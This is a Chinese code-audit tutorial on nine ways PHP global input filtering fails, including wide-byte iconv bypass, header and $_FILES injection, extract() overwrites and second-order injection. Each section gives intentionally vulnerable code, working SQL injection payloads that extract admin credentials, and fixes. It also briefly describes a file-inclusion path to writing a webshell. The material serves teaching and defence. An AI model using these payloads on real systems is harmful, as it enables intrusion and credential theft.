---
title: 代码审计中全局防护的九大盲点：整型注入、数组键名注入、SERVER变量注入、FILES注入、变量覆盖、字符编码转换绕过、函数误用绕过、二次注入与解码函数二次解码绕过
description: 系统梳理代码审计中全局防护机制的九大盲点——整型注入绕过、数组键名注入、SERVER变量注入（X-Forwarded-For等）、FILES注入（$_FILES未被转义导致的SQL注入）、变量覆盖（extract/parse_str/$$
  变量变量覆盖）、字符编码转换绕过（iconv/mb_convert_encoding 导致的宽字节注入绕过 addslashes/GPC）、函数误用绕过（str_replace/stripslashes
  错误使用消解转义）、二次注入（存储与调用时序差异）及解码函数二次解码绕过（urldecode/base64_decode 在 addslashes 后执行导致单引号恢复），结合实战案例深度解析成因、利用链构造及修复方案，形成白盒审计视角的完整知识体系。
category: program-analysis
tags:
- 代码审计
- 全局防护
- 整型注入
- 数组键名注入
- SERVER变量注入
- X-Forwarded-For
- FILES注入
- 变量覆盖
- extract
- parse_str
- 变量变量
- SQL注入
- PHP安全
- 白盒测试
- TipAsk
- HackBraid
- 乌云
- 宽字节注入
- iconv
- 字符编码转换
- GBK
- UTF-8
- addslashes绕过
- GPC绕过
- str_replace
- stripslashes
- 二次注入
- urldecode绕过
- base64_decode绕过
- 二次解码
- 全局防护绕过
date: 2016-06-24
updated: '2026-11-17'
---

## 概述

本页面基于「白帽子分享之代码审计的艺术系列—第三季、第四季、第五季、第六季」（作者：HackBraid，乌云核心白帽子）及 301在路上 微信归档文章《白帽子分享之代码的艺术系列—第二篇》整理，系统阐述 **全局防护机制在代码审计中常被忽视的九大盲点**：

1. **整型注入绕过**：数字型参数无需单引号闭合，完全绕过 GPC `addslashes` 转义。
2. **数组键名注入**：全局防护仅遍历数组 `value` 进行转义，遗漏 `key` 导致键名直接拼接入 SQL。
3. **SERVER 变量注入**：全局防护仅覆盖 `$_GET/$_POST/$_COOKIE`，遗漏 `$_SERVER` 等超全局数组（如 `X-Forwarded-For`、`CLIENT_IP` 等）。
4. **FILES 注入**：全局转义遗漏 `$_FILES`，上传文件名、类型等字段未转义直接入库引发 SQL 注入。
5. **变量覆盖**：`extract()`、`parse_str()`、`$$`（变量变量）等危险函数/语法允许攻击者以任意键名覆盖现有变量，劫持 SQL 拼接、包含路径、鉴权标识等关键逻辑。
6. **字符编码转换绕过**：`iconv()`、`mb_convert_encoding()` 等编码转换函数在 `addslashes`/GPC 转义**之后**执行，利用 GBK/UTF-8 互转特性“吃掉”反斜杠，导致单引号逃逸，绕过全局防护。
7. **函数误用绕过**：`str_replace` 删除单引号导致残留反斜杠转义后续引号、`stripslashes` 直接抹除 `addslashes` 添加的转义字符，消解全局防护效果。
8. **二次注入**：数据入库时经转义存储，取出时转义字符消失，二次使用时未重新转义直接拼接 SQL，导致注入。
9. **解码函数二次解码绕过**：`urldecode()`、`base64_decode()` 等解码函数在全局 `addslashes` 防护**之后**执行，将已转义的编码 Payload 还原为含单引号、反斜杠的原始攻击代码，导致防护失效。

前三类属于 **“全局防护覆盖不全/类型处理缺陷”**，第四类属于 **“超全局数组遗漏”**，第五类属于 **“危险语法滥用”**，第六类属于 **“编码转换时序缺陷”**，第七类属于 **“转义后处理不当”**，第八类属于 **“存储与调用上下文割裂”**，第九类属于 **“解码还原时序缺陷”**，均是白盒审计中高产出、低门槛的挖掘切入点。

---

## 盲点一：整型注入绕过

### 核心原理

| 场景 | 原因 | 绕过关键 |
|------|------|----------|
| 参数未做 `intval` 转换、SQL 无单引号保护 | 数字型参数不需要单引号闭合，`addslashes` 仅转义引号、反斜杠、NUL，对数字无效 | 直接拼接 `union select` 等 Payload |
| PHP 弱类型判断逻辑错误 | `0 < 1` 与 `0 union select 1 < 1` 在弱类型比较下均为 `true` | 利用 `id=0 union select...` 绕过数值范围检查 |
| 多条 SQL 中后续语句缺失单引号 | 第一条 SQL 有保护，第二条拼接同一变量时忘记加引号 | 同一变量在不同语句中上下文不一致 |

> **审计口诀**：搜索 `id=`、`page=`、`cid=` 等数字型参数；检查是否强制 `intval()`/`(int)`；检查 SQL 拼接是否**始终**包裹单引号；检查弱类型比较（`<` `>` `==`）是否可被数字型 Payload 绕过。

### 实战案例复现（第五季示例）

#### 无转换、无引号保护
```php
// int1.php
$id = $_GET['id'];
$sql = "SELECT * FROM news WHERE id=$id";  // 无单引号
```
**Payload**：`id=-1 union select 1,2,concat(name,0x23,pass) from admin#`

#### 弱类型判断绕过
```php
// int2.php
$id = $_GET['id'];
if ($id < 1) exit();  // 0 < 1 为 true，但 "0 union select..." < 1 在弱类型下也为 true
$sql = "SELECT * FROM news WHERE id=$id";
```
**Payload**：`id=0 union select 1,2,concat(name,0x23,pass) from admin#`

#### 多语句上下文不一致
```php
// int3.php
$id = $_GET['id'];
$sql1 = "SELECT * FROM news WHERE id='$id'";  // 有引号
$sql2 = "UPDATE news SET views=views+1 WHERE id=$id";  // 无引号
```
**Payload**：`id=0 union select 1,2,concat(name,0x23,pass) from admin#`（第二条语句触发注入）

### 修复方案
- **强制类型转换**：`$id = intval($_GET['id']);` 或 `$id = (int)$_GET['id'];`
- **统一参数化查询**：PDO 预处理语句彻底消除拼接。
- **白名单校验**：`if (!ctype_digit($id)) exit();`
- **代码规范**：所有数字型入库字段统一走 `intval` 封装函数，禁止裸用 `$_GET/$_POST`。

---

## 盲点二：数组键名注入

### 核心原理

| 防护代码典型写法 | 遗漏点 | 后果 |
|------------------|--------|------|
| `foreach($_POST as $k=>$v) $_POST[$k]=addslashes($v);` | 仅转义 `$v`，`$k`（键名）未转义 | 键名直接拼接入 SQL，单引号未被转义，触发注入 |

> **审计口诀**：全局搜索 `foreach($_POST`、`foreach($_GET`、`foreach($_REQUEST`、`foreach($_COOKIE`，检查循环体是否仅对 `$v` 操作；重点关注业务中使用数组参数的场景（批量删除、排序、多条件筛选）。

### 实战案例复现（第五季示例）

#### 全局防护缺陷
```php
// common.inc.php
foreach($_POST as $k=>$v) $_POST[$k]=addslashes($v);  // 只过滤 value
foreach($_GET as $k=>$v) $_GET[$k]=addslashes($v);
foreach($_COOKIE as $k=>$v) $_COOKIE[$k]=addslashes($v);
```

#### 漏洞触发点
```php
// array.php
foreach($_POST['title'] as $key=>$val) {
    $sql = "SELECT * FROM news WHERE id='$key' and title='$val'";  // $key 直接拼接，有单引号保护但未转义
    $result = mysql_query($sql);
}
```

#### 利用构造
- 正常请求：`title[1]=news title` → SQL: `WHERE id='1' and title='news title'`
- 注入 Payload（POST body）：
  ```text
  title[-1' union select 1,2,concat(name,0x23,pass) from admin#]=news title
  ```
- 实际 SQL：`WHERE id='-1' union select 1,2,concat(name,0x23,pass) from admin#' and title='news title'`

### 修复方案
- **键名同步转义**：
  ```php
  foreach($_POST as $k=>$v) {
      $_POST[addslashes($k)] = addslashes($v);  // key 也要转义
  }
  ```
- **更推荐：递归深度转义函数**（兼容多维数组）：
  ```php
  function addslashes_deep($value) {
      if (is_array($value)) {
          $new = [];
          foreach($value as $k=>$v) {
              $new[addslashes_deep($k)] = addslashes_deep($v);
          }
          return $new;
      }
      return addslashes($value);
  }
  $_POST = addslashes_deep($_POST);
  $_GET  = addslashes_deep($_GET);
  $_COOKIE = addslashes_deep($_COOKIE);
  ```
- **根治**：放弃全局 `addslashes`，全面上 **PDO 预处理语句**，业务层显式绑定参数。

### 关联审计模式
- [[code-audit-file-upload-vulnerabilities]]：批量上传、多文件处理常涉及数组参数，键名注入可结合文件名可控扩大攻击面。
- [[upload-labs-file-upload-bypass-writeup]]：第 19 关条件竞争上传中数组参数处理不当可延伸为键名注入。

---

## 盲点三：SERVER 变量注入

### 核心原理

| 全局防护典型覆盖 | 遗漏对象 | 典型注入点 |
|------------------|----------|------------|
| `$_GET` `$_POST` `$_COOKIE` `$_REQUEST` | `$_SERVER`、`$_ENV`、`$_FILES` | `X-Forwarded-For`、`CLIENT_IP`、`HTTP_HOST`、`HTTP_REFERER`、`HTTP_USER_AGENT`、`QUERY_STRING` 等 |

> **审计口诀**：搜索 `$_SERVER[`、`getenv(`、`apache_request_headers(`，重点关注 **获取客户端 IP 入库**、**日志记录**、**统计分析**、**防刷限流** 等业务逻辑。

### 常见可控 SERVER 变量

| 变量 | 含义 | 可控性 | 典型场景 |
|------|------|--------|----------|
| `HTTP_X_FORWARDED_FOR` | 代理转发 IP | **完全可控**（客户端发送 Header） | 获取真实 IP、访问日志、投票限流 |
| `HTTP_CLIENT_IP` | 客户端声称 IP | **完全可控** | 同 `XFF` |
| `HTTP_X_REAL_IP` | Nginx 真实 IP 头 | **完全可控** | 同 `XFF` |
| `HTTP_HOST` | Host 头 | **可控**（未校验时） | 密码重置链接生成、SSRF 回调地址 |
| `HTTP_REFERER` | Referer 头 | **完全可控** | 统计分析、防盗链、回跳逻辑 |
| `HTTP_USER_AGENT` | UA 头 | **完全可控** | 访问日志、UA 统计、设备适配 |
| `QUERY_STRING` | 原始查询字符串 | **可控** | 日志记录、路由分发 |

### 实战案例复现（第五季示例）

#### 获取 IP 入库函数
```php
// common.func.php
function get_client_ip() {
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } elseif (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}
```

#### 漏洞触发点
```php
// log.php
$ip = get_client_ip();
$sql = "INSERT INTO access_log (ip, url) VALUES ('$ip', '$_SERVER[REQUEST_URI]')";
// $ip 来自 X-Forwarded-For，未转义，单引号保护失效
```

#### 利用构造
- 请求头：`X-Forwarded-For: -1' union select 1,2,concat(name,0x23,pass) from admin#`
- 实际 SQL：`INSERT INTO access_log (ip, url) VALUES ('-1' union select 1,2,concat(name,0x23,pass) from admin#', '/log.php')`

### 修复方案
- **纳入全局转义**：
  ```php
  $_SERVER = addslashes_deep($_SERVER);  // 递归转义
  ```
- **IP 获取白名单校验**：
  ```php
  function get_client_ip() {
      $ip = $_SERVER['REMOTE_ADDR'];  // 优先信任 REMOTE_ADDR（TCP 连接源 IP，不可伪造）
      if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
          $xff = $_SERVER['HTTP_X_FORWARDED_FOR'];
          // 简单校验：仅取第一个合法 IPv4/IPv6
          if (preg_match('/^(\d{1,3}\.){3}\d{1,3}$/', $xff)) {
              $ip = $xff;
          }
      }
      return $ip;
  }
  ```
- **参数化查询**：日志入库统一使用 Prepared Statement。
- **WAF/RASP 层面**：对 `X-Forwarded-For` 等头部进行 SQL 关键字检测。

### 关联审计模式
- [[http-header-forgery-stored-xss]]：`X-Forwarded-For`、`Client-IP` 伪造导致存储型 XSS，同源于 SERVER 变量未过滤。
- [[xd-security-xss-vulnerability-notes-day25-28]]：HTTP 头伪造注入向量导致的存储型 XSS 成因分类与案例复现。
- [[ssrf-bypass-techniques]]：`X-Forwarded-For` 等头部在 SSRF 绕过中的利用。

---

## 盲点四：FILES 注入

### 核心原理

| 防护对象 | 典型代码 | 遗漏对象 | 后果 |
|----------|----------|----------|------|
| `$_GET` `$_POST` `$_REQUEST` `$_COOKIE` | `foreach($_POST as $k=>$v) $_POST[$k]=addslashes($v);` | `$_FILES` | 文件名 `name`、类型 `type`、临时名 `tmp_name` 等字段未转义，直接拼接入 SQL 执行 |

> **审计口诀**：全局搜索 `addslashes`/`mysql_real_escape_string`/`mysqli_real_escape_string` 等转义调用，检查是否遍历了 `$_FILES`；若仅遍历 `$_GET/$_POST/$_REQUEST/$_COOKIE`，即存在盲点。

### 实战案例：TipAsk 问答系统

#### 全局防护代码审计
```php
// common.inc.php 或类似入口文件
foreach($_GET as $k=>$v) $_GET[$k]=addslashes($v);
foreach($_POST as $k=>$v) $_POST[$k]=addslashes($v);
foreach($_COOKIE as $k=>$v) $_COOKIE[$k]=addslashes($v);
// 缺少对 $_FILES 的遍历转义
```

#### 漏洞触发点追踪
- **文件**：`/control/attach.php`（上传处理控制器）
- **关键调用链**：
  ```php
  $clientFile["name"] = $_FILES["upfile"]["name"];   // 直接取未转义的文件名
  $_ENV['attach']->add($clientFile["name"], ...);    // 进入模型层入库
  ```
- **模型层 SQL 拼接**（`model/attach.php`）：
  ```php
  $sql = "INSERT INTO ".DB_TABLEPRE."attach (filename, ...) VALUES ('{$filename}', ...)";
  // $filename 来自 $clientFile["name"]，未经转义直接拼接
  ```

#### 利用构造
1. 准备一个任意文件（如 `test.jpg`）
2. 使用 Burp Suite 抓包修改 `filename` 参数为 Payload：
   ```text
   test.jpg', (SELECT CONCAT(username,0x3a,password) FROM pre_members WHERE uid=1), ..., ...)
   ```
   > 实际利用需根据表结构调整列数、闭合单引号、注释尾部。
3. 上传后，Payload 被插入 `attach` 表的 `filename` 字段，管理员在后台查看附件列表或前台调用时触发二次注入，或直接通过报错回显获取数据。

#### 修复方案
- **全局层面**：在入口文件统一对 `$_FILES` 递归转义：
  ```php
  function addslashes_deep($value) {
      return is_array($value) ? array_map('addslashes_deep', $value) : addslashes($value);
  }
  $_FILES = addslashes_deep($_FILES);
  ```
- **模型层面**：使用预处理语句（Prepared Statement）或参数化查询，彻底消除拼接注入风险。
- **业务层面**：文件名落库前强制重命名（UUID/哈希），仅保留扩展名白名单校验。

### 关联审计模式
- [[code-audit-file-upload-vulnerabilities]]：文件上传漏洞挖掘方法论中“全局搜索定位 → 路由分析 → 危险函数识别”流程可直接复用于 FILES 注入排查。
- [[arbitrary-file-download-vulnerability-analysis]]：HDWiki 备份功能审计展示了“用户可控参数入库 → 二次利用”的同构模式。
- [[upload-labs-file-upload-bypass-writeup]]：第 19 关条件竞争上传结合文件名可控，可延伸为 FILES 注入利用链。

---

## 盲点五：变量覆盖

### 危险函数/语法对比

| 函数/语法 | 原型 | 覆盖机制 | 典型场景 | 风险等级 |
|-----------|------|----------|----------|----------|
| `extract()` | `extract(array $var_array, int $flags = EXTR_OVERWRITE)` | 将数组键名作为变量名、键值作为变量值导入当前符号表，默认覆盖同名变量 | 模板引擎渲染、配置初始化、历史代码兼容 | ⭐⭐⭐⭐⭐ |
| `parse_str()` | `parse_str(string $string, array &$result)` | 无第二参数时直接向当前作用域导入变量（PHP 7.2+ 弃用、8.0+ 移除） | 处理 `application/x-www-form-urlencoded` 数据、二次解码 | ⭐⭐⭐⭐ |
| `$$` (变量变量) | `${$var}` 或 `$$var` | 以变量 `$var` 的值作为新变量名进行赋值/读取 | 动态变量名构造、兼容旧版 `register_globals` 逻辑 | ⭐⭐⭐ |

> **审计口诀**：全局搜索 `extract(`

### 实战利用链构造

#### 覆盖表前缀实现 SQL 注入
```php
// config.php
$pre = "pre_";   // 表前缀

// vuln.php
extract($_POST);  // 攻击者 POST: pre=pre_ WHERE 1=1 UNION SELECT 1,2,password-- -
$sql = "SELECT * FROM {$pre}users WHERE id=1";
// 实际执行：SELECT * FROM pre_ WHERE 1=1 UNION SELECT 1,2,password-- - users WHERE id=1
```

#### 覆盖包含路径实现任意文件包含/代码执行
```php
// common.inc.php
$template_dir = "./templates/default/";

// vuln.php
extract($_GET);  // 攻击者 GET: template_dir=/var/www/uploads/shell.jpg%00
include $template_dir."header.php";
// PHP < 5.3.4 可利用 %00 截断；高版本需结合 phar://、zip:// 等伪协议
```

#### `$$` 变量变量覆盖示例
```php
// vuln.php
$a = "safe_value";
$b = $_GET['var'];   // 攻击者传入 var=evil
$$b = $_GET['val'];  // 等价于 $evil = 'attacker_controlled'
// 若后续代码使用 $a 进行鉴权，且存在变量名可控的二次赋值，可链式覆盖
```

### 经典案例：湖湘杯 WillPHP 文件包含
> 详见 [[huxiangbei-willphp-file-inclusion-writeup]]

- **入口**：`assign()/view()` → `Tple::renderTo()`
- **变量覆盖**：`extract($this->var)` 覆盖 `$cfile`（模板文件路径）
- **任意包含**：`include $cfile` → 包含 `pearcmd.php` 写入 Webshell
- **核心链**：用户输入 → `extract()` 覆盖内部变量 → `include` 受控参数 → RCE

### 修复方案

| 方案 | 适用场景 | 代码示例 |
|------|----------|----------|
| **禁用/替换** | 新代码开发 | 用 `foreach($arr as $k=>$v) $$k = $v;` 显式控制，或直接 `$var = $arr['key'];` |
| **旗位限制** | 必须用 `extract()` | `extract($arr, EXTR_SKIP);` 不覆盖已存在变量；`EXTR_PREFIX_ALL` 加前缀 |
| **显式声明白名单** | 模板引擎渲染 | `$allowed = ['title','content']; extract(array_intersect_key($arr, array_flip($allowed)));` |
| **禁用 `parse_str` 无第二参数调用** | 遗留代码维护 | `parse_str($str, $out); $var = $out['key'];` |
| **静态分析规则** | CI/CD 集成 | Fortify/FindBugs/自定义规则：标记 `extract(`、`parse_str(`、`\$\$` 为高危 |

### 关联审计模式
- [[code-audit-installation-reinstallation-vulnerabilities]]：安装/重装逻辑中“变量覆盖劫持”类型直接对应 `extract($_POST)` 覆盖 `$install_lock`、`$db_config` 等关键变量。
- [[logic-vulnerability-password-reset-audit]]：逻辑漏洞审计中“服务端验证割裂”常配合变量覆盖绕过鉴权。
- [[oasys-system-code-audit]]：Oasys 审计中拦截器鉴权逻辑缺陷可结合变量覆盖实现垂直越权。
- [[xd-security-code-audit-notes-day50-57]]：PHP/Java 代码审计方法论中“关键字搜索策略”列举 `extract`、`parse_str`、`$$` 为必检危险函数。

---

## 盲点六：字符编码转换绕过（iconv/mb_convert_encoding）

### 核心原理

当应用在 **全局防护（GPC/addslashes）之后** 调用 `iconv()`、`mb_convert_encoding()` 等函数进行字符编码转换（GBK ↔ UTF-8），会导致转义反斜杠（`\` / `%5c`）被“吃掉”，使单引号逃逸，形成宽字节注入。

| 转换方向 | 关键机制 | 利用字符示例 | 字节变化 |
|----------|----------|--------------|----------|
| **GBK → UTF-8** | GBK 双字节首字节 `0x81-0xFE` + 尾字节 `0x40-0xFE`（含 `0x5c`），转 UTF-8 后合并为一个 Unicode 字符，尾字节 `0x5c` 消失 | `%df%27` → addslashes → `%df%5c%27` → iconv → `運%27`（U+904B + 单引号） | `%df%5c` → `U+904B`，`%27` 保留 |
| **UTF-8 → GBK** | UTF-8 字符 `錦` (E9 8C A6) 转 GBK 为 `E5 5C`，尾字节恰为 `0x5c`；addslashes 在转换**前**给单引号加反斜杠，转换后形成 `E5 5C 5C 27`，即 `錦` + `\\` + `'`，SQL 解析时 `\\` 变义为单个反斜杠，`'` 闭合字符串 | `錦'` → addslashes → `錦\`'` → iconv → `E5 5C 5C 27` | `E9 8C A6` → `E5 5C`，`5C` 保留，`27` 保留 |

> **审计口诀**：搜索 `iconv(`、`mb_convert_encoding(`、`iconv_set_encoding(`；检查调用位置是否在 **全局转义之后**、**SQL 拼接之前**；重点关注搜索框、标题、评论等文本型输入点。

### 实战案例复现（第四季示例）

#### 场景一：GBK → UTF-8 转换
```php
// kuanzifu1.php
require_once('common.php');  // common.php 中开启 GPC 或手动 addslashes($_GET/$_POST/$_COOKIE)
$title_tmp = isset($_GET['title']) ? urldecode($_GET['title']) : 'news title';
// 关键点：转义已发生，这里再做 GBK→UTF-8 转换
$title = iconv("gbk","utf-8",$title_tmp);
$sql = "SELECT * FROM news WHERE title = '{$title}'";
```

**利用构造**：
- 输入：`title=%df%27 union select 1,2,concat(name,0x23,pass) from admin%23`
- 过程：
  1. GPC/addslashes：`%df%27` → `%df%5c%27`
  2. `iconv("gbk","utf-8")`：`%df%5c` 在 GBK 中合法（汉字“運”），转为 UTF-8 单字符 `U+904B`；`%27` 保持不变。
  3. 最终 SQL：`SELECT * FROM news WHERE title = '運' union select 1,2,concat(name,0x23,pass) from admin#'`
- 结果：单引号逃逸，UNION 注入成功。

#### 场景二：UTF-8 → GBK 转换
```php
// kuanzifu2.php
require_once('common.php');
$title_tmp = isset($_GET['title']) ? urldecode($_GET['title']) : 'news title';
// 关键点：转义已发生，这里再做 UTF-8→GBK 转换
$title = iconv("utf-8","gbk",$title_tmp);
$sql = "SELECT * FROM news WHERE title = '{$title}'";
```

**利用构造**：
- 输入：`title=錦' union select 1,2,concat(name,0x23,pass) from admin%23`（`錦` 为 UTF-8 编码 `E9 8C A6`）
- 过程：
  1. GPC/addslashes：`錦'` → `錦\`'`（字节：`E9 8C A6 5C 27`）
  2. `iconv("utf-8","gbk")`：`錦` → `E5 5C`；`5C` → `5C`；`27` → `27`。结果字节：`E5 5C 5C 27`
  3. MySQL (GBK 连接) 解析：`E5 5C` = 一个汉字；`5C 5C` = 转义后的反斜杠（即字面 `\`）；`27` = 单引号，**闭合字符串**。
  4. 最终 SQL：`SELECT * FROM news WHERE title = '錦\\' union select ... #'`
- 结果：单引号逃逸，UNION 注入成功。

### 修复方案

| 方案 | 说明 | 优先级 |
|------|------|--------|
| **调整时序：转换在转义前** | 先 `iconv`/`mb_convert_encoding` 统一编码，再 `addslashes`/参数化查询。 | P0 |
| **数据库连接层指定字符集** | PDO: `charset=utf8mb4`；mysqli: `set_charset('utf8mb4')`；避免 `SET NAMES gbk`。 | P0 |
| **废弃 `addslashes`，全面参数化** | 使用 PDO Prepared Statements，彻底消除编码相关绕过。 | P0 |
| **输入编码强制校验** | `mb_check_encoding($input, 'UTF-8')` 失败则拒绝；禁止混合编码输入。 | P1 |
| **WAF/RASP 规则** | 检测 `iconv`/`mb_convert_encoding` 后紧跟 SQL 拼接的调用链；拦截含 `%df%27`、`%e5%5c%5c%27` 等特征 Payload。 | P1 |

### 关联审计模式
- [[code-audit-widebyte-sql-injection-iconv]]：深度解析 PHP 中 iconv 函数进行 GBK 与 UTF-8 互转时引发的宽字节 SQL 注入原理、利用条件及两种转换方向的实战 POC 构造。
- [[php-file-inclusion-vulnerability]]：文件包含场景中若存在编码转换，可结合宽字节绕过 `addslashes` 实现 LFI/RFI。
- [[ssrf-bypass-techniques]]：SSRF Payload 中编码转换导致的绕过（如 URL 编码双重解码、Unicode 规范化）属同类编码时序问题。
- [[xd-security-code-audit-notes-day50-57]]：代码审计关键字搜索策略中应新增 `iconv`、`mb_convert_encoding`、`charset` 等编码相关函数。

---

## 盲点七：函数误用绕过（str_replace / stripslashes）

### 核心原理

开发者在全局防护（GPC/`addslashes`）**之后**，使用 `str_replace` 删除特定字符（如单引号），或使用 `stripslashes` 移除反斜杠，导致原本的转义保护失效，甚至制造新的注入点。

| 函数 | 误用模式 | 破坏机制 | 典型后果 |
|------|----------|----------|----------|
| `str_replace("'", '', $var)` | 删除单引号 | `addslashes` 将 `'` 转为 `\'`，`str_replace` 删掉 `'` 留下 `\`，该反斜杠转义 SQL 语句中原本的闭合引号，导致后续参数可注入 | 后续拼接参数的单引号被吃掉，实现跨参数注入 |
| `stripslashes($var)` | 删除反斜杠 | 直接抵消 `addslashes`/`GPC` 添加的所有转义，还原原始 Payload | 完全绕过全局防护，等同于无防护环境 |

> **审计口诀**：全局搜索 `str_replace(`、`stripslashes(`；检查其调用位置是否在 **全局转义之后**、**SQL 拼接之前**；重点关注“先转义，后替换/清理”的代码模式。

### 实战案例复现（第三季示例）

#### `str_replace` 误用导致跨参数注入

**缺陷代码**（`streplace.php`）：
```php
<?php
require_once('common.php');  // common.php 中对 $_GET 执行了 addslashes
$conn = mysql_connect('localhost', 'root', 'braid') or die('bad!');
mysql_query("SET NAMES binary");
mysql_select_db('test', $conn) OR emMsg("数据库连接失败");
$tmp_id = isset($_GET['id']) ? $_GET['id'] : 1;
$title = isset($_GET['title']) ? $_GET['title'] : 'news title';
// 程序编写时直接用 str_replace 去掉 id 里的单引号
$id = str_replace("'", '', $tmp_id);
// sql 查询语句通过 id 和 title 两个条件进行查询
$sql = "SELECT * FROM news WHERE id='{$id}' and title='{$title}'";
echo $sql;
$result = mysql_query($sql, $conn) or die(mysql_error());
?>
```

**执行流程分析**：
1. 用户输入：`id=-1'`，`title=news title`
2. `common.php` 中 `addslashes` 处理：`id` 变为 `-1\'`（即 `-1\\'`）
3. `str_replace("'", '', $tmp_id)`：删除单引号，`id` 变为 `-1\`（仅剩反斜杠）
4. SQL 拼接：`SELECT * FROM news WHERE id='-1\' and title='news title'`
5. **关键点**：`id` 后的反斜杠 `\` 转义了 SQL 语句中硬编码的闭合单引号 `'`，导致 `and title='news title'` 成为字符串内容，`title` 参数闭合单引号后可构造注入。

**利用构造**：
- 请求：`http://localhost/sqltest/streplace.php?id=-1'&title=union select 1,2,concat(name,0x23,pass) from admin%23`
- 实际 SQL：`SELECT * FROM news WHERE id='-1\' and title='union select 1,2,concat(name,0x23,pass) from admin#'`
- 结果：`title` 参数成功注入，获取管理员账号密码。

#### `stripslashes` 误用导致完全绕过

**缺陷代码**（`stripslashes.php`）：
```php
<?php
require_once('common.php');
$conn = mysql_connect('localhost', 'root', 'braid') or die('bad!');
mysql_query("SET NAMES binary");
mysql_select_db('test', $conn) OR emMsg("数据库连接失败");
$tmp_id = isset($_GET['id']) ? $_GET['id'] : 1;
// 直接使用 stripslashes 删除反斜杠
$id = stripslashes($tmp_id);
$sql = "SELECT * FROM news WHERE id='{$id}'";
echo $sql.'<br />';
$result = mysql_query($sql, $conn) or die(mysql_error());
?>
```

**执行流程分析**：
1. 用户输入：`id=-1'`
2. `common.php` 中 `addslashes` 处理：`id` 变为 `-1\'`
3. `stripslashes($tmp_id)`：删除反斜杠，`id` 还原为 `-1'`
3. SQL 拼接：`SELECT * FROM news WHERE id='-1''` → 语法错误，单引号闭合，可直接注入。

**利用构造**：
- 请求：`http://localhost/sqltest/stripslashes.php?id=-1' union select 1,2,concat(name,0x23,pass) from admin%23`
- 结果：完全绕过全局防护，直接执行 UNION 注入。

### 修复方案

| 方案 | 说明 | 优先级 |
|------|------|--------|
| **禁止在转义后使用 `str_replace` 删除引号/反斜杠** | 若需过滤特定字符，应在 **转义前** 进行，或使用参数化查询彻底避免拼接。 | P0 |
| **禁用 `stripslashes`** | 除非明确需处理已转义的外部数据（如从数据库读取的已转义字符串），否则不应在输入处理流程中使用。 | P0 |
| **统一输入处理流程** | 入口文件统一：`编码统一 → 类型强制/长度限制 → 参数化绑定`。禁止业务代码二次处理转义字符。 | P0 |
| **代码规范检查** | 静态扫描规则：标记 `addslashes`/`GPC` 后紧跟 `str_replace`/`stripslashes`/`stripcslashes` 为高危模式。 | P1 |

### 关联审计模式
- [[php-webshell-fundamentals-chopper-analysis]]：Webshell 免杀中常利用 `str_replace`/`stripslashes` 对抗特征匹配，审计时需区分“防御绕过”与“攻击利用”语境。
- [[xd-security-waf-bypass-techniques-day46-49]]：WAF 绕过技术中“Payload 变异”常模拟此类函数误用逻辑构造绕过 Payload。

---

## 盲点八：二次注入

### 核心原理

二次注入利用 **数据入库时转义存储、取出时转义字符消失、二次使用时未重新转义直接拼接 SQL** 的时序差异。

| 阶段 | 处理 | 状态 |
|------|------|------|
| **入库** | 用户输入 `braid'` → `addslashes` → `braid\'` → SQL `INSERT ... VALUES ('braid\\'')` → MySQL 存储为 `braid'` | 转义字符 `\` 被 MySQL 消费，实际存储内容含单引号 |
| **出库/二次使用** | `SELECT nickname FROM users WHERE uid=1` → 取得 `braid'` → 直接拼入新 SQL：`UPDATE profile SET sig='{$nickname}'` | 单引号未被转义，闭合 SQL 语句，触发注入 |

> **审计口诀**：搜索 `INSERT`/`UPDATE` 入库点与后续 `SELECT` 取出后直接拼接 SQL 的点；重点关注**个人资料修改、评论回复、订单备注、日志记录**等“存储-展示/再处理”业务链。

### 实战案例复现（第三季示例）

#### 场景描述
1. **注册/修改资料**：用户提交昵称 `braid'`，经全局 `addslashes` 转义入库，数据库实际存 `braid'`。
2. **二次利用点**：某页面展示昵称或将昵称用于其他 SQL 操作（如更新签名、生成推荐链接），代码如下：
   ```php
   $nickname = $db->get_one("SELECT nickname FROM users WHERE uid={$uid}"); // 取得 braid'
   $sql = "UPDATE profile SET signature='{$nickname}' WHERE uid={$uid}"; // 直接拼接
   ```
3. **触发**：执行 SQL 变为 `UPDATE profile SET signature='braid'' WHERE uid=1`，单引号闭合，可构造 `braid', sig=(SELECT CONCAT(user,pass) FROM admin)#` 实现注入。

### 修复方案

| 方案 | 说明 | 优先级 |
|------|------|--------|
| **全链路参数化查询** | 入库、出库、再拼接均使用 Prepared Statement，彻底消除上下文切换风险。 | P0 |
| **出库时重新转义** | 若无法参数化，二次拼接前必须对从数据库读取的数据再次执行 `addslashes`/`mysqli_real_escape_string`。 | P1 |
| **存储原始数据，输出时转义** | 入库存原始输入（参数化），不同输出上下文（HTML/JS/SQL/Shell）分别按需转义（Output Encoding）。 | P0 (最佳实践) |
| **业务逻辑隔离** | 避免将可控业务数据（昵称、评论）直接用于敏感 SQL 操作（权限变更、管理员操作）。 | P1 |

### 关联审计模式
- [[code-audit-second-order-sqli]]：系统梳理二次 SQL 注入核心成因：入库时转义单引号存储、出库时直接拼接查询导致转义失效。
- [[wecenter-v334-phar-deserialization-sqli]]：Cookie 注入 Phar 反序列化载荷经数据库存取触发，属于“存储-反序列化-二次利用”变种。
- [[xd-security-logic-vulnerability-notes-day33-36]]：逻辑漏洞中“多阶段绕过”常涉及数据存储与后续校验的上下文不一致。

---

## 盲点九：解码函数二次解码绕过（urldecode/base64_decode）

### 核心原理

应用在 **全局防护（GPC/addslashes）之后** 调用 `urldecode()`、`base64_decode()` 等解码函数处理用户输入。全局防护作用于**编码后的字符串**（如 `%27`、`JTI3`），这些字符本身不含单引号、反斜杠等危险字符，故 `addslashes` 不做任何处理。随后解码函数将其还原为原始攻击 Payload（单引号 `'`、反斜杠 `\` 等），导致防护完全失效。

| 解码函数 | 编码示例 | addslashes 处理结果 | 解码后结果 | 绕过关键 |
|----------|----------|---------------------|------------|----------|
| `urldecode()` | `%2527` (双重编码单引号) | `%2527` (无特殊字符，不变) | `%27` → `'` (单引号) | PHP `$_GET` 自动解码一次，配合代码二次 `urldecode` 实现双重解码 |
